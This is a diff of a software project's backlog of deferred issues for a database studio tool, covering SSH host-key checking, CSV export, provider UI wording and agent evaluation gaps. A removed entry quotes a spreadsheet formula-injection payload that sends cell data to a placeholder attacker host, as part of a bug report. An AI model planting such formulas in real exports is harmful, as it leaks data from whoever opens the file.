@@ -19,30 +19,24 @@ None of it is a GitHub issue.
 
 ---
 
----
-
----
-
----
-
 **Sections**
 
 - [SQL statement reading](#sql-statement-reading) — S1–S8 · 8
-- [Drivers and connections](#drivers-and-connections) — D1–D10, U17 · 10
+- [Drivers and connections](#drivers-and-connections) — D1–D11, U17 · 11
 - [Value interpolation](#value-interpolation) — V1
 - [Row editing](#row-editing) — R1
-- [Studio UI and query execution](#studio-ui-and-query-execution) — X1–X7, U2–U18 · 13
+- [Studio UI and query execution](#studio-ui-and-query-execution) — X2–X7, U2–U18 · 9
 - [Authentication and security headers](#authentication-and-security-headers) — AU2
 - [Tests](#tests) — T1–T3 · 2
 - [Dependencies](#dependencies) — P1–P6 · 6
-- [Documentation](#documentation) — DOC1–DOC4 · 4
+- [Documentation](#documentation) — DOC1–DOC3 · 3
 - [Release pipeline](#release-pipeline) — REL1
 - [Chart configuration surface](#chart-configuration-surface) — N1–N3 · 3
 - [Security Phase 1 deferrals](#security-phase-1-deferrals) — H1–H13 · 10
 - [Security Phase 2 deferrals](#security-phase-2-deferrals) — C2–C10 · 9
 - [Security Phase 3 deferrals](#security-phase-3-deferrals) — K2–K4 · 2
 - [Agent M1 deferrals (#328)](#agent-m1-deferrals-328) — A1–A6 · 5
-- [Agent M2 deferrals (#329)](#agent-m2-deferrals-329) — B1–B56 · 39
+- [Agent M2 deferrals (#329)](#agent-m2-deferrals-329) — B1–B56 · 38
 
 ---
 
@@ -483,33 +477,8 @@ puts it in the storage secret walk in `src/lib/storage/connection-secrets.ts`.
 **Done when:** a tunnel verifies the bastion's host key against something the connection carries, an
 unverifiable key fails the connection with an error naming the fingerprint it saw, and the chosen
 first-contact policy is written in `docs/providers/`-adjacent documentation the dialog can point to.
+
 ---
-
-### D11. The SSH tunnel accepts any host key it is offered
-
-`createSSHTunnel` (`src/lib/ssh/tunnel.ts`) builds `connectOptions` from host, port, username and
-one of password or private key, and passes no `hostVerifier`. ssh2 has no default: with the callback
-absent the library does not verify the server's key at all, so the tunnel completes against whatever
-answers on that address. Every byte the tunnel carries - the database password among them - is
-readable to anything that can occupy the bastion's address, and nothing in the product ever shows a
-fingerprint the user could have compared.
-
-This is the layer where the check belongs and the only one that can do it: the database driver sees
-`127.0.0.1` and a local port, so its own TLS settings say nothing about who terminated the SSH hop.
-Found while fixing #457 and deliberately kept out of that PR: the fix there is about whether the
-tunnel is opened at all, and a verification policy is a separate decision with a UI consequence.
-
-The open decision is what to do on first contact, since Studio has no known-hosts store: refuse
-unknown keys and require the expected fingerprint to be configured (safe, and unusable until someone
-pastes a fingerprint), or trust-on-first-use pinned per connection (usable, and only as good as the
-first connection was). `SSHTunnelConfig` in `src/lib/types.ts` would carry the pin either way, which
-puts it in the storage secret walk in `src/lib/storage/connection-secrets.ts`.
-
-**Done when:** a tunnel verifies the bastion's host key against something the connection carries, an
-unverifiable key fails the connection with an error naming the fingerprint it saw, and the chosen
-first-contact policy is written in `docs/providers/`-adjacent documentation the dialog can point to.
----
-
 
 ## Value interpolation
 
@@ -556,20 +525,6 @@ goes away in a major, with this work.
 
 `U2` came out of the #384 review. The `X` entries came out of the #422 export review — each was
 named, weighed and left out of that PR, so they are recorded rather than re-derived.
-
-### X1. A CSV cell beginning `=`, `+`, `-` or `@` is a formula to a spreadsheet
-
-`src/lib/export/csv.ts` writes the value it was given, exactly. A cell holding
-`=HYPERLINK("http://attacker/"&A1)` is data in the database and a formula in Excel, LibreOffice and
-Google Sheets. It evaluates when someone who did not write the query opens the file.
-
-The fix is not in doubt (prefix with `'`, or wrap it), but it MUTATES the user's values on the way
-out — the opposite of what every other line in that file does. That is a product decision about which
-of two wrong answers to give, and it wants an owner: a checkbox on the export menu, a setting, or a
-rule the docs state.
-
-**Done when:** a cell a spreadsheet would evaluate cannot be evaluated by opening the file, and the
-choice is stated where the user makes it.
 
 ### X2. An export writes the page the grid holds, not the result the user asked for
 
@@ -662,39 +617,6 @@ file's ratio is not the tree's.
 **Done when:** the scope is widened with the benign sites made explicit, or the decision not to is
 recorded here with the number that justified it.
 
-### U4. The profile modal's error state cannot be dismissed
-
-`DataProfiler` renders the message `/api/db/profile` returned and offers no way out. Escape does not
-close it, and the header's close control is under the error card.
-
-#427 measured this on Redis, where the route answered 400 for every key-prefix row, but the fault is
-not Redis's: any provider whose profile request fails traps the user the same way. #427 hid the menu
-item on providers whose rows are derived groupings, which removes the reachable path without fixing
-the modal.
-
-**Done when:** a failed profile is dismissable by Escape and by the modal's own close control, for
-every provider that can fail it.
-
-### U6. The Reindex card has no per-provider wording, so it still speaks Postgres
-
-`ProviderLabels` carries an `analyzeGlobal*` and a `vacuumGlobal*` triad and no `reindexGlobal` one.
-#427 made the Operations tab render the first two. The reindex card stays hardcoded to *"Run
-Reindex"* / *"Rebuild Indexes"* / *"Reconstructs all indexes in the database."*
-
-Three providers declare `reindex`: Postgres, SQLite and Couchbase. For Couchbase, whose reindex is a
-GSI rebuild rather than a table reindex, that copy is wrong the same way the analyze copy was wrong
-for Redis. Adding the triad was out of scope for #427: it touches `ProviderLabels` and every provider
-that implements it.
-
-A smaller twin sits on the same screen. The per-table Analyze and Vacuum buttons are titled with the
-hardcoded `"Analyze"` and `"Vacuum"`, so MongoDB's *"Validate Collection"*, ClickHouse's *"Table
-Statistics"* and Oracle's *"Rebuild Indexes"* never reach them. Wiring those is entangled with U9 and
-should be done with it.
-
-**Done when:** `reindexGlobalLabel` / `reindexGlobalTitle` / `reindexGlobalDesc` exist, the three
-declaring providers set them, the card renders them with the current strings as fallback, and the
-per-table buttons carry `analyzeAction` / `vacuumAction`.
-
 ### U9. Four providers point `vacuumAction` at something that is not `vacuum`, and MySQL offers one it lacks
 
 Two mismatches, measured while fixing #427 and left alone.
@@ -719,28 +641,18 @@ it names. The target grammar differs even among providers declaring the same `Ma
 Oracle's `optimize` wants an index name, ClickHouse's wants a table, Couchbase's `reindex` wants a
 keyspace.
 
+**A third mismatch, measured 2026-08-23 while giving the Reindex card per-provider wording.** The
+global Reindex card cannot succeed on Couchbase at all, whatever it is titled. `dispatchMaintenance()`
+routes `reindex` — and `analyze`, and `kill` — through `requireTarget()`, while
+`OperationsTab.handleRunMaintenance("reindex")` sends no target, so the card answers *"The reindex
+operation requires a target"*. That change gave the card honest wording and deliberately left the
+behaviour alone, because a global control over a per-keyspace operation is the same shape of mistake
+the reverted mapping was. Either the card names a keyspace or Couchbase should not offer it globally.
+
 **Done when:** each provider declares which operation its `vacuumAction` (and `analyzeAction`) stands
-for *and* what kind of target it takes, both surfaces gate and title from that declaration, and a
-live Oracle run proves the per-table control succeeds rather than returning ORA-01418.
-
-### U13. BEGIN and SANDBOX render on engines that have no transactions
-
-`Studio.tsx` supplies `onBeginTransaction`/`onCommit`/`onRollback` unconditionally, so `QueryToolbar`
-renders the trio — and SANDBOX, which auto-rolls-back through the same route — on every connection.
-`POST /api/db/transaction` then refuses: *"Transaction control is not supported for this database
-type"*. Measured 2026-08-19 on OpenSearch, HTTP 400 for both `begin` and `rollback`. Elasticsearch,
-Druid, Couchbase, MongoDB, Redis, Trino and Cassandra are in the same position.
-
-The toolbar's own doc comment states the rule this breaks — *"A caller that cannot run transactions
-omits all three"* — added by #427 when the embedded shell was showing three dead buttons. The
-standalone shell now does the same thing for a different reason: there is no capability to gate on.
-The server gates on `isTransactionProvider(provider)`, a runtime shape check no client can read, and
-`ProviderCapabilities` has no `supportsTransactions`.
-
-Not folded into #424: the capability has to be added to every provider at once.
-
-**Done when:** a provider declares whether it has transactions, `Studio.tsx` omits the trio and the
-sandbox toggle where it does not, and every provider's doc states its answer.
+for *and* what kind of target it takes, both surfaces gate and title from that declaration, the
+Couchbase Reindex card either carries a target or is withheld, and a live Oracle run proves the
+per-table control succeeds rather than returning ORA-01418.
 
 ### U18. The login hero has no vertical slack left, and the relatives line spends 56px it does not have
 
@@ -1035,29 +947,6 @@ above.
 
 **Done when:** each listing has been resubmitted through its own channel with copy that matches the
 shipped product.
-
----
-### DOC4. Three packaging manifests publish "thirteen engines" against fourteen drivers
-
-Found while sweeping the relatives count for the ScyllaDB row, and left out of that change on purpose:
-it is a different denominator with its own history, and these are package-manager manifests rather
-than the marketplace listings DOC3 covers.
-
-| File | Line | Says |
-| --- | --- | --- |
-| `packaging/chocolatey/libredb-studio.nuspec.tmpl` | 31 | "thirteen engines" |
-| `packaging/homebrew/libredb-studio.rb.tmpl` | 12 | "thirteen engines" |
-| `packaging/winget/LibreDB.Studio.locale.en-US.yaml.tmpl` | 16, 19 | "thirteen engines" |
-
-The count they mean is the external drivers, which is **fourteen** since Cassandra landed
-(`EXTERNAL_DATABASE_TYPES.length` in `src/lib/db/compatibility.ts`). All three are published listing
-copy on live channels, so the wrong number is public rather than internal.
-
-Two things to settle rather than bumping the digit, which is the mistake #445 recorded: whether a
-template nothing regenerates from the registry should carry a count at all, and which denominator the
-listing wants — fourteen drivers, or the named products README.md publishes.
-
-**Done when:** each of the four lines states a number that matches the registry or states no number.
 
 ---
 
@@ -2397,39 +2286,6 @@ database has answered it, and should be able to say so without inventing a query
 
 **Done when:** a data-analysis run can conclude "not answerable here" and be scored `answered` for it,
 with the rule stated in `WORKFLOW_TOOL_RULES` and an eval asserting no fabricated statement is sent.
-
-### B44. The documented least-privilege role sees no foreign key, and the run asserts none exists
-
-Found on 2026-08-17 while re-driving `docs/AGENT_DEMO.md` in a browser. Two halves, and the second is
-the one that reaches a user.
-
-**The read comes back empty.** `composePostgresRelations` reads
-`information_schema.table_constraints` / `key_column_usage` / `constraint_column_usage`. PostgreSQL
-restricts those views to constraints on tables the current role owns or holds a privilege on *other
-than* `SELECT`. So the role `docs/AGENT_DEMO.md` prescribes — `CONNECT`, `USAGE`, `SELECT ON ALL
-TABLES`, `pg_read_all_stats` — sees none of them.
-
-Measured on the seeded dvdrental as `libredb_agent` (`usesuper = f`):
-`information_schema.table_constraints` returns **0** rows with `constraint_type = 'FOREIGN KEY'`, while
-`pg_constraint WHERE contype = 'f'` holds **18**. The relations graph packed into the run's context is
-empty for the exact role the product tells operators to create.
-
-**The run then asserts the negative.** Asked what tables exist and how they relate, an investigation run
-answered *"There are no declared foreign key constraints between tables in the database"* — false, and
-cited to a schema snapshot that genuinely contained nothing. A zero-row relations read cannot
-distinguish "this database declares no foreign keys" from "this role cannot see the ones it declares",
-and nothing today makes the run say which it means. The neighbouring case survived only because the
-model reconstructed the join path from column names, which is luck, not evidence.
-
-The first half is **B8's rewrite arriving for a second reason.** `pg_constraint` is readable by any role
-with `USAGE` on the schema, so that same rewrite closes this too.
-
-The second half is a separate decision and does not go away with the rewrite, since any role can be
-narrower than the database.
-
-**Done when:** a run on a `SELECT`-only role reports this database's foreign keys, **and** an empty
-relations read no longer licenses "there are no foreign keys" — the run either says it could not see them
-or says nothing about them, with a test that pins the distinction.
 
 ### B45. Every optimization run is scored `unanswered`, including one that produced a correct index
 
